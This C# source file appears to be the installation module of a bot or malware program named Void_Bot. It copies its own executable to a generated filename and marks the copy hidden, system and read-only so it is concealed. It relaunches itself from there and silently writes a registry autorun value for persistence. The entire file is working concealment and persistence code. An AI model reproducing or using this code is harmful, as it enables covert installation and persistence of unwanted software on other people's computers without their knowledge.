using System;
using System.IO;

namespace Void_Bot.Core;

internal class Installation
{
	public static string DestinationPath = Path.Combine(Config.BotData_Environment, Functions.GenerateBotFilename());

	public static bool IsInstalled()
	{
		return Path.GetDirectoryName(Config.BotData_Path) == Config.BotData_Environment;
	}

	public static void Start()
	{
		if (!Win32.RenameFile(Config.BotData_Path, DestinationPath))
		{
			File.Copy(Config.BotData_Path, DestinationPath);
		}
		if (File.Exists(DestinationPath))
		{
			File.SetAttributes(DestinationPath, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
			Win32.STARTUPINFO lpStartupInfo = default(Win32.STARTUPINFO);
			Win32.PROCESS_INFORMATION lpProcessInformation = default(Win32.PROCESS_INFORMATION);
			Win32.CreateProcess(DestinationPath, null, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 0u, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation);
		}
		Environment.Exit(0);
	}

	public static void PrepareAutoRun()
	{
		try
		{
			Functions.GenerateRegistryPath().SetValue(Config.BotData_RegistryValueName, Config.BotData_Path);
		}
		catch
		{
		}
	}
}
